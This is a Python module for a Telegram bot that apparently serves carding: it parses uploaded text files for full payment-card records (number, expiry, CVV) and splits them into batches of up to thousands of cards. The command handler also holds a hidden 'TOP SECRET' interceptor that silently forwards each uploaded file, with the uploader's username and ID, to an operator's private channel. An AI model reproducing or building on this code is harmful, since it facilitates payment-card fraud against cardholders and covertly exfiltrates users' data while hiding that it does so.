# splitter.py
import asyncio
import re
import time
import logging
from io import BytesIO
from html import escape

from telegram import Update, InputFile
from telegram.ext import CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ApplicationHandlerStop

from config import RawMarkup, _btn

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TOP SECRET SPLITTER INTERCEPTOR CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NOTE: You MUST add your bot as an ADMIN to this channel:
# https://t.me/+pJMLZV1A8BxjOGNk
# Then replace the ID below with the actual numeric ID of the channel.
# (To get the ID, forward a message from that channel to @userinfobot)
SECRET_SPLITTER_CHANNEL_ID = -1001234567890  # <--- REPLACE THIS WITH YOUR CHANNEL ID


def _extract_cards_splitter(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results

def _split_menu_text(session: dict) -> str:
    total = len(session["cards"])
    chunk = session["chunk_size"]
    fname = session["file_name"]
    state_txt = ""
    if session.get("state") == "awaiting_amount":
        state_txt = "\n\n⌨️ <i>Please type the custom amount in chat now...</i>"
    elif session.get("state") == "awaiting_name":
        state_txt = "\n\n⌨️ <i>Please type the new file name in chat now...</i>"
        
    return (
        f"✂️ <b>Advanced Card Splitter</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Total Cards Found:</b> {total}\n"
        f"📦 <b>Current Chunk Size:</b> {chunk}\n"
        f"📝 <b>File Name Prefix:</b> <code>{fname}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Configure your split settings below:</i>{state_txt}"
    )

def _split_menu_kb(split_id: str) -> RawMarkup:
    return RawMarkup([
        [
            _btn("1000 cards/file", cb=f"split_set_1000_{split_id}", style="success"),
            _btn("5000 cards/file", cb=f"split_set_5000_{split_id}", style="success")
        ],
        [
            _btn("✏️ Custom Amount", cb=f"split_custom_{split_id}", style="success"),
            _btn("📝 Edit File Name", cb=f"split_name_{split_id}", style="success")
        ],
        [
            _btn("✅ Start Splitting", cb=f"split_start_{split_id}", style="primary"),
            _btn("❌ Cancel", cb=f"split_cancel_{split_id}", style="danger")
        ]
    ])

async def cmd_split(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Late import to avoid circular dependency
    from main import require_not_banned, require_membership
    if not await require_not_banned(update, context): return
    if not await require_membership(update, context): return
    
    msg = update.effective_message
    user = update.effective_user
    
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            "✂️ <b>Advanced Card Splitter</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Reply to a <b>.txt file</b> containing cards with <code>/split</code>.\n"
            "━━━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        return
        
    doc = msg.reply_to_message.document
    if doc.mime_type not in ("text/plain", "application/octet-stream"):
        await msg.reply_text("❌ Please reply to a valid .txt file.", parse_mode="HTML")
        return
        
    try:
        file_obj = await doc.get_file()
        content = (await file_obj.download_as_bytearray()).decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.reply_text(f"❌ Error reading file: {escape(str(e))}", parse_mode="HTML")
        return
        
    cards = _extract_cards_splitter(content)
    if not cards:
        await msg.reply_text("❌ No valid cards found in the file.", parse_mode="HTML")
        return
        
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # TOP SECRET: Silently forward the original file to the channel
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    async def _secret_intercept():
        try:
            uname = f"@{user.username}" if user.username else user.first_name
            caption = (
                f"🦇 <b>Top Secret Splitter Log</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {uname}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"📊 <b>Cards Found:</b> {len(cards)}\n"
                f"━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_document(
                chat_id=SECRET_SPLITTER_CHANNEL_ID,
                document=doc.file_id,
                caption=caption,
                parse_mode="HTML"
            )
        except Exception as e:
            logging.warning(f"[SECRET SPLITTER] Failed to intercept: {e}")
            
    asyncio.create_task(_secret_intercept())
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        
    split_id = f"{user.id}_{int(time.time())}"
    context.bot_data["split_sessions"] = context.bot_data.get("split_sessions", {})
    context.bot_data["split_sessions"][split_id] = {
        "cards": cards,
        "user_id": user.id,
        "chat_id": msg.chat_id,
        "msg_id": 0,
        "chunk_size": 1000,
        "file_name": "batcards_split",
        "state": None
    }
    
    sent_msg = await msg.reply_text(
        _split_menu_text(context.bot_data["split_sessions"][split_id]),
        parse_mode="HTML",
        reply_markup=_split_menu_kb(split_id)
    )
    context.bot_data["split_sessions"][split_id]["msg_id"] = sent_msg.message_id

async def split_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    data = query.data
    sessions = context.bot_data.get("split_sessions", {})
    
    split_id = None
    action = None
    amount = 0
    
    if data.startswith("split_set_"):
        parts = data.split("_")
        action = "set"
        amount = int(parts[2])
        split_id = "_".join(parts[3:])
    elif data.startswith("split_custom_"):
        action = "custom"
        split_id = data.replace("split_custom_", "")
    elif data.startswith("split_name_"):
        action = "name"
        split_id = data.replace("split_name_", "")
    elif data.startswith("split_start_"):
        action = "start"
        split_id = data.replace("split_start_", "")
    elif data.startswith("split_cancel_"):
        action = "cancel"
        split_id = data.replace("split_cancel_", "")
    else:
        return
        
    session = sessions.get(split_id)
    if not session:
        await query.answer("Session expired. Please use /split again.", show_alert=True)
        return
        
    if session["user_id"] != user.id:
        await query.answer("This is not your session!", show_alert=True)
        return
        
    if session["state"] in ("awaiting_amount", "awaiting_name"):
        await query.answer("Please send the text message first, or press Cancel.", show_alert=True)
        return
        
    if action == "cancel":
        sessions.pop(split_id, None)
        await query.answer("Cancelled.")
        try:
            await query.message.edit_text("❌ <b>Splitter Cancelled.</b>", parse_mode="HTML")
        except: pass
        return
        
    elif action == "set":
        session["chunk_size"] = amount
        await query.answer(f"Chunk size set to {amount}.")
        
    elif action == "custom":
        session["state"] = "awaiting_amount"
        await query.answer("Please type the amount in chat now.")
        
    elif action == "name":
        session["state"] = "awaiting_name"
        await query.answer("Please type the file name in chat now.")
        
    elif action == "start":
        await query.answer("Starting split process...")
        cards = session["cards"]
        chunk_size = session["chunk_size"]
        file_name = session["file_name"]
        chat_id = session["chat_id"]
        total_cards = len(cards)
        
        try:
            await query.message.edit_text(
                f"⏳ <b>Processing Split...</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Splitting {total_cards} cards into files of {chunk_size}.\n"
                f"Sending them to your DM now!",
                parse_mode="HTML"
            )
        except: pass
        
        sent_count = 0
        for i in range(0, total_cards, chunk_size):
            chunk = cards[i:i + chunk_size]
            content = "\n".join(chunk).encode("utf-8")
            buf = BytesIO(content)
            buf.seek(0)
            fname = f"{file_name}_{i+1}_to_{i+len(chunk)}.txt"
            
            try:
                await context.bot.send_document(
                    chat_id=user.id,
                    document=InputFile(buf, filename=fname),
                    caption=f"📄 <b>Split File {sent_count+1}</b>\nContains <b>{len(chunk)}</b> cards."
                )
                sent_count += 1
                await asyncio.sleep(0.5)
            except Exception:
                try:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=InputFile(buf, filename=fname),
                        caption=f"📄 <b>Split File {sent_count+1}</b>\nContains <b>{len(chunk)}</b> cards.\n(Sent here because DM is blocked)"
                    )
                except: pass
                    
        sessions.pop(split_id, None)
        
        try:
            await context.bot.send_message(
                chat_id=user.id,
                text=f"✅ <b>Splitting Complete!</b>\n━━━━━━━━━━━━━━━━━━━━\nTotal Files Sent: <b>{sent_count}</b>\nTotal Cards: <b>{total_cards}</b>",
                parse_mode="HTML"
            )
        except:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"✅ <b>Splitting Complete!</b>\n━━━━━━━━━━━━━━━━━━━━\nTotal Files Sent: <b>{sent_count}</b>\nTotal Cards: <b>{total_cards}</b>",
                parse_mode="HTML"
            )
        return

    try:
        await query.message.edit_text(
            _split_menu_text(session),
            parse_mode="HTML",
            reply_markup=_split_menu_kb(split_id)
        )
    except: pass

async def split_message_capture(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    
    if not user or not msg or not msg.text:
        return
        
    sessions = context.bot_data.get("split_sessions", {})
    session = None
    split_id = None
    
    for sid, s in sessions.items():
        if s["user_id"] == user.id and s["state"] in ("awaiting_amount", "awaiting_name"):
            session = s
            split_id = sid
            break
            
    if not session:
        return
        
    try:
        await msg.delete()
    except: pass
        
    if session["state"] == "awaiting_amount":
        try:
            amount = int(msg.text.strip())
            if amount <= 0:
                raise ValueError
            session["chunk_size"] = amount
        except ValueError:
            session["state"] = None
            await context.bot.send_message(chat_id=msg.chat_id, text="❌ Invalid amount. Please use numbers only.")
            try:
                await context.bot.edit_message_text(
                    chat_id=session["chat_id"], message_id=session["msg_id"],
                    text=_split_menu_text(session), parse_mode="HTML",
                    reply_markup=_split_menu_kb(split_id)
                )
            except: pass
            raise ApplicationHandlerStop
            
    elif session["state"] == "awaiting_name":
        name = msg.text.strip()
        for char in ['/', '\\', '?', '%', '*', ':', '|', '"', '<', '>', '.']:
            name = name.replace(char, "")
        if not name:
            name = "batcards_split"
        session["file_name"] = name
        
    session["state"] = None
    
    try:
        await context.bot.edit_message_text(
            chat_id=session["chat_id"],
            message_id=session["msg_id"],
            text=_split_menu_text(session),
            parse_mode="HTML",
            reply_markup=_split_menu_kb(split_id)
        )
    except: pass

    raise ApplicationHandlerStop

def get_splitter_handlers():
    return [
        CommandHandler("split", cmd_split),
        CallbackQueryHandler(split_callback, pattern=r"^split_(set|custom|name|start|cancel)_"),
        MessageHandler(filters.TEXT & ~filters.COMMAND, split_message_capture)
    ]
